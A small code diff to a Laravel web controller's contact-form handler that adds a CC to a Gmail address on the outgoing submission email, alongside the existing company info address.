@@ -76,7 +76,7 @@ class WebController extends Controller
             ['captcha.captcha' => 'Invalid captcha code.']
         );
         try {
-            Mail::to('info@ibtglobalpreciousmetal.com')->send(new ContactFormSubmitEmail($request));
+            Mail::to('info@ibtglobalpreciousmetal.com')->cc('chichearie@gmail.com')->send(new ContactFormSubmitEmail($request));
         } catch (Exception $e) {
             return redirect()->back()->with("error", $e->getMessage())->withInput($request->all());
         }
